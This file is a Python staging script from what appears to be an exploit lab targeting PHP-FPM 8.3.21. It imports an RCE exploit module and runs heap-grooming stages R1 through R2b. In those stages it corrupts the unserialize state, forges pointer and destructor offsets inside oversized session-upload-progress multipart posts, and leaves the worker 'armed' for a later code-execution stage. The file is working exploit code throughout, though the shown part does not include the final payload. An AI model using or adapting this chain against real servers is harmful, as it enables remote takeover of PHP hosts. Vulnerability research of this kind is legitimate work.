#!/usr/bin/env python3
"""Prepare the one-worker lab through R2b and leave its child armed for R3."""

from __future__ import annotations

import sys
import time
import struct
import os
from pathlib import Path


sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "exploits"))
import php8321_fpm_rce as p  # noqa: E402
from inspect_bg_unserialize import inspect  # noqa: E402


R2B_SLOTS = int(os.environ.get("R2B_SLOTS", "8"), 0)


def arm(sid: str) -> None:
    p.build_A(sid)
    print(f"A[{sid}] done", flush=True)
    time.sleep(p.SETTLE)
    print(f"prime {sid} -> {p.prime_request(sid)[0]}", flush=True)
    state = inspect("php2shell-fpm-8321")
    if state["level"] != 1 or not state["last_offset"] or not state["last_dtor_offset"]:
        raise RuntimeError(f"worker did not retain BG(unserialize): {state}")
    p.E_OFF = int(str(state["last_offset"]), 0)
    p.DT_OFF = int(str(state["last_dtor_offset"]), 0)
    # In this request geometry the reclaimed BIG parser buffer begins 0xffe8
    # bytes before var_entries, for both layouts observed on the pinned image.
    p.FBASE = p.E_OFF - 0xFFE8
    print(
        f"profile E={p.E_OFF:#x} DT={p.DT_OFF:#x} FBASE={p.FBASE:#x}",
        flush=True,
    )


def plain_stage(key: bytes, patches: list[tuple[int, bytes]], press: int = 0) -> int:
    """Forge E and DT through separate copies of a 0x50000-byte BIG value.

    /plain.php produces copies at 0x65000, 0xb6018 and 0x116018 on the pinned
    image. The larger value covers both the ordinary E=0x96000 profile and the
    E=0xeb000 profile that appears after some worker replacements.
    """
    filler_size = 0x50000
    copies = (0x65000, 0xB6018, 0x116018)
    filler = bytearray(b"A" * filler_size)
    for target, value in patches:
        for base in copies:
            if base <= target and target + len(value) <= base + filler_size:
                offset = target - base
                filler[offset:offset + len(value)] = value
                break
        else:
            raise RuntimeError(f"no plain BIG copy covers {target:#x}")
    parts = [
        ("BIG", bytes(filler), None),
        ("PHP_SESSION_UPLOAD_PROGRESS", key, None),
        ("f", b"Z", b"a.bin"),
    ]
    parts += p.press_parts(press)
    return p.post(parts, p.SID_REC, p.PLAIN)[0]


def r2a() -> None:
    patches = [
        (p.E_OFF, struct.pack("<q", p.aim(p.SCALAR_PUSH))),
        (p.DT_OFF, struct.pack("<q", 0)),
    ]
    print(f"R2a -> {plain_stage(p.PAYLOAD, patches)}", flush=True)


def r2b() -> None:
    patches = [
        (p.E_OFF, struct.pack("<q", p.aim(p.ARRAY_PUSH))),
        (p.DT_OFF, struct.pack("<q", 0)),
        (p.DT_OFF + 0x20, b"\x00" * 8),
        (p.DT_OFF + 0x28, b"\x00" * 8),
        (p.DT_OFF + 0x30, struct.pack("<Q", R2B_SLOTS)),
    ]
    print(f"R2b -> {plain_stage(b'K2', patches, press=p.PRESS)}", flush=True)


def main() -> int:
    sid_rec = p.SID_REC
    sid_prime = p.SID_PRIME
    if not p.wait_target():
        raise SystemExit("target is not answering")

    print(f"R1 -> {p.record_request(sid_rec, p.PAYLOAD)[0]}", flush=True)
    p.wait_target()
    p.disarm()

    arm(sid_prime)
    r2a()

    p.wait_target()
    p.disarm()
    arm(sid_prime)
    r2b()

    p.wait_target()
    p.disarm()
    arm(sid_prime)
    print("READY_FOR_R3", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
